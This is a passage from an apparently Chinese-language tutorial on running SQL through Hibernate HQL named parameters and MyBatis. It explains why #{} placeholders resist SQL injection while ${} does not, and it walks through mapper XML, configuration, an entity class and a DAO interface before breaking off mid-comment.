<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">String hql=”from User user where user.name=:customername ”;
</span></span><span class="line"><span class="cl">Query query=session.createQuery(hql);
</span></span><span class="line"><span class="cl">query.setParameter(“customername”,name,Hibernate.STRING);
</span></span></code></pre></td></tr></table>
</div>
</div><p>　　如上面代码所示，setParameter()方法包含三个参数，分别是命名参数名称，命名参数实际值，以及命名参数映射类型。对于某些参数类型setParameter()方法可以根据参数值的Java类型，猜测出对应的映射类型，因此这时不需要显示写出映射类型，像上面的例子，可以直接这样写:<code>query.setParameter(“customername”,name);</code>但是对于一些类型就必须写明映射类型，比如java.util.Date类型，因为它会对应Hibernate的多种映射类型，比如Hibernate.DATA或者Hibernate.TIMESTAMP。</p>
<h4 id="4使用mybatis执行sql语句">4.使用MyBatis执行SQL语句</h4>
<p>MyBatis是一个Java持久化框架，他通过XML描述符或注解把对象与存储过程或SQL语句连接起来</p>
<ul>
<li>#{变量} 可以防止注入，底层是用prepareStatement实现的/使用占位符?来实现的</li>
<li>${变量} 不能防注入，底层的用拼接实现的</li>
</ul>
<p><strong>小例子:</strong></p>
<p>1、新建一个maven项目，在pom文件中添加mybatis依赖及MySQL依赖</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!-- mybatis核心依赖 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;groupId&gt;</span>org.mybatis<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;artifactId&gt;</span>mybatis<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;version&gt;</span>${mybatis.version}<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- mysql驱动 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;groupId&gt;</span>mysql<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;artifactId&gt;</span>mysql-connector-java<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;version&gt;</span>${mysql.version}<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>mybatis配置文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE configuration PUBLIC &#34;-//mybatis.org//DTD Config 3.0//EN&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">        &#34;http://mybatis.org/dtd/mybatis-3-config.dtd&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- mybatis核心配置，用于配置相关数据源以及连接池等信息，以及实体类的别称映射，插件配置等等 --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;configuration&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 指定实体类的别名，方便在mapper配置中进行引用 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;typeAliases&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- 方法1、定义一个alias别名，缺点在于需要一个实体类分别指定
</span></span></span><span class="line"><span class="cl"><span class="c">        &lt;typeAlias type=&#34;edu.nf.ch01.entity.Users&#34; alias=&#34;user&#34; /&gt;--&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- 方法2、也可以使用package来给某个包下面的所有实体类自动创建别名，
</span></span></span><span class="line"><span class="cl"><span class="c">        自动创建的别名规则是类的类名并将首字母改为小写 --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;package</span> <span class="na">name=</span><span class="s">&#34;edu.nf.ch01.entity&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/typeAliases&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 配置数据源环境，default指定默认的数据源 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;environments</span> <span class="na">default=</span><span class="s">&#34;mysql&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- 创建一个MySQL的数据源环境，id就叫mysql --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;environment</span> <span class="na">id=</span><span class="s">&#34;mysql&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="c">&lt;!-- 配置事务管理，这里有JDBC和MANAGED两个值
</span></span></span><span class="line"><span class="cl"><span class="c">             JDBC：使用本地jdbc的事务
</span></span></span><span class="line"><span class="cl"><span class="c">             MANAGED：mybatis不参与事务管理，由运行容器来管理事务--&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;transactionManager</span> <span class="na">type=</span><span class="s">&#34;JDBC&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="c">&lt;!-- 配置数据源，type指定获取连接的方式，有以下几个值：
</span></span></span><span class="line"><span class="cl"><span class="c">             POOLED：使用mybatis自带的数据库连接池（方便连接的复用）
</span></span></span><span class="line"><span class="cl"><span class="c">             UNPOOLRF：不使用连接池，而是每次请求都从数据库去获取连接
</span></span></span><span class="line"><span class="cl"><span class="c">              JMDI：通过查找JNDI树去获取数据源对象，通常结合web容器或者EJB容器来配置 --&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;dataSource</span> <span class="na">type=</span><span class="s">&#34;POOLED&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="c">&lt;!-- 配置数据源信息，驱动，url，连接的账号密码等 --&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;driver&#34;</span> <span class="na">value=</span><span class="s">&#34;com.mysql.jdbc.Driver&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;url&#34;</span> <span class="na">value=</span><span class="s">&#34;jdbc:mysql://localhost:3306/mybatis?useUnicode=true&amp;characterEncoding=utf-8&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;username&#34;</span> <span class="na">value=</span><span class="s">&#34;root&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;password&#34;</span> <span class="na">value=</span><span class="s">&#34;root&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/dataSource&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/environment&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/environments&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 指定mapper配置文件 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;mappers&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;mapper</span> <span class="na">resource=</span><span class="s">&#34;mapper/UsersMapper.xml&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/mappers&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/configuration&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>UsersMapper.xml：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE mapper PUBLIC &#34;-//mybatis.org//DTD Mapper 3.0//EN&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">        &#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- mapper根节点的namespace指定Dao接口的完整类名，
</span></span></span><span class="line"><span class="cl"><span class="c">因为mybatis在解析的时候要根据这个类名找到相应dao方法执行 --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;mapper</span> <span class="na">namespace=</span><span class="s">&#34;edu.nf.ch01.dao.UserDao&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 映射SQL语句，比如&lt;insert&gt;标签用于映射insert语句，
</span></span></span><span class="line"><span class="cl"><span class="c">     id属性对应Dao接口中的方法名
</span></span></span><span class="line"><span class="cl"><span class="c">     parameterType表示Dao接口方法参数的类型，可以指定完整类名，
</span></span></span><span class="line"><span class="cl"><span class="c">     这里指定实体类的别名，也就是在mybatis.xml中定义的别名
</span></span></span><span class="line"><span class="cl"><span class="c">     在sql语句中使用#{}表达式来指定要插入的列，{}中指定实体的字段名--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;insert</span> <span class="na">id=</span><span class="s">&#34;save&#34;</span> <span class="na">parameterType=</span><span class="s">&#34;edu.nf.ch01.entity.Users&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        insert into user_info(u_name) values(#{userName})
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/insert&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 如果参数类型时Map集合，那么#{}表达式对应的就是Map的kek，parameterType中也可以为map --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;insert</span> <span class="na">id=</span><span class="s">&#34;save2&#34;</span> <span class="na">parameterType=</span><span class="s">&#34;java.util.Map&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        insert into user_info(u_name) values(#{uname})
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/insert&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;update</span> <span class="na">id=</span><span class="s">&#34;update&#34;</span> <span class="na">parameterType=</span><span class="s">&#34;edu.nf.ch01.entity.Users&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        update user_info set u_name = #{userName} where u_id = #{uid};
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/update&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;delete</span> <span class="na">id=</span><span class="s">&#34;delete&#34;</span> <span class="na">parameterType=</span><span class="s">&#34;int&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        delete from user_info where u_id = #{id}
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/delete&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 当有多个参数时，不需要指定parameterType属性，
</span></span></span><span class="line"><span class="cl"><span class="c">    而是使用#{param1}#{param2}...的方式映射参数，对应方法参数的顺序 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;update</span> <span class="na">id=</span><span class="s">&#34;update2&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        update user_info set u_name = #{param1} where u_id = #{param2}
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/update&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 查询当个用户，将结果集封装成一个实体对象
</span></span></span><span class="line"><span class="cl"><span class="c">     resultType属性指定查询结果集的返回类型，
</span></span></span><span class="line"><span class="cl"><span class="c">     如果返回一个实体，则返回引用mybatis.xml文件中Alias设置的别名
</span></span></span><span class="line"><span class="cl"><span class="c">     需要注意的是，查询sql语句中，查询column必须要和实体的字段名称相同--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;select</span> <span class="na">id=</span><span class="s">&#34;getUserById&#34;</span> <span class="na">parameterType=</span><span class="s">&#34;java.lang.String&#34;</span> <span class="na">resultType=</span><span class="s">&#34;users&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        select u_id as uid, u_name as userName from user_info2 where u_id = #{id}
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/select&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 查询单个用户，将结果集封装成一个map集合
</span></span></span><span class="line"><span class="cl"><span class="c">     此时只需要将resultType设置为map即可--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;select</span> <span class="na">id=</span><span class="s">&#34;getUserById2&#34;</span> <span class="na">parameterType=</span><span class="s">&#34;java.lang.String&#34;</span> <span class="na">resultType=</span><span class="s">&#34;map&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        select u_id, u_name from user_info2 where u_id = #{id}
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/select&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 查询用户列表，返回list集合，集合中封装了多个实体对象 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;select</span> <span class="na">id=</span><span class="s">&#34;listUser&#34;</span> <span class="na">resultType=</span><span class="s">&#34;users&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        select u_id as uid, u_name as userName from user_info2
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/select&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 查询用户列表，返回list集合，集合中存放多个map对象 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;select</span> <span class="na">id=</span><span class="s">&#34;listUser2&#34;</span> <span class="na">resultType=</span><span class="s">&#34;map&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        select u_id, u_name from user_info2
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/select&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/mapper&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>新建Users类：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="n">Integer</span> <span class="n">uid</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="n">String</span> <span class="n">userName</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">Integer</span> <span class="nf">getUid</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">uid</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">setUid</span><span class="o">(</span><span class="n">Integer</span> <span class="n">uid</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">.</span><span class="na">uid</span> <span class="o">=</span> <span class="n">uid</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">String</span> <span class="nf">getUserName</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">userName</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">setUserName</span><span class="o">(</span><span class="n">String</span> <span class="n">userName</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">.</span><span class="na">userName</span> <span class="o">=</span> <span class="n">userName</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>MybatisUtils类：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kd">static</span> <span class="n">SqlSessionFactory</span> <span class="n">sqlSessionFactory</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">* 在静态代码块中初始化工厂
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">static</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//先查找mybatis的核心配置文件来初始化数据源，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//默认从classpath下查找核心配置文件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//注意：import org.apache.ibatis.io.Resources;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="n">Resources</span><span class="o">.</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="s">&#34;mybatis.xml&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//创建一个SqlSessionFactoryBuilder来解析配置文件的信息，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 然后创建出SqlSessionFactory实例
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SqlSessionFactoryBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SqlSessionFactoryBuilder</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//build方法传入一个输入流，通过解析后返回一个SqlSessionFactory实例
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">sqlSessionFactory</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">* 提供一个获取SqlSession的方法
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param autoCommit 在获取SQL Session时可以传递一个boolean类型的参数值，
</span></span></span><span class="line"><span class="cl"><span class="cm">*             这个参数的作用似乎用于设置是否手动提交事务还是自动提交事务，
</span></span></span><span class="line"><span class="cl"><span class="cm">*             false为手动提交，true为自动提交
</span></span></span><span class="line"><span class="cl"><span class="cm">* @return
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="n">SqlSession</span> <span class="nf">getSqlSession</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">autoCommit</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//通过openSession方法来创建一个sqlSession实例，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//有了SqlSession，就可以来访问数据库
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="n">sqlSessionFactory</span><span class="o">.</span><span class="na">openSession</span><span class="o">(</span><span class="n">autoCommit</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>UserDao接口：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 通过传递一个对象形式保存用户
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param user
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">save</span><span class="o">(</span><span class="n">Users</span> <span class="n">user</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 通过传递一个map集合保存用户
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param map
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">save2</span><span class="o">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 通过传递一个对象修改用户
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param user
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update</span><span class="o">(</span><span class="n">Users</span> <span class="n">user</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 通过id删除用户
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param id
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete</span><span class="o">(</span><span class="kt">int</span> <span class="n">id</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 通过传递多个参数修改用户
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param userName
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param uid
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update2</span><span class="o">(</span><span class="n">String</span> <span class="n">userName</span><span class="o">,</span> <span class="kt">int</span> <span class="n">uid</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 根据id查询一条结果集，返回一个实体对象
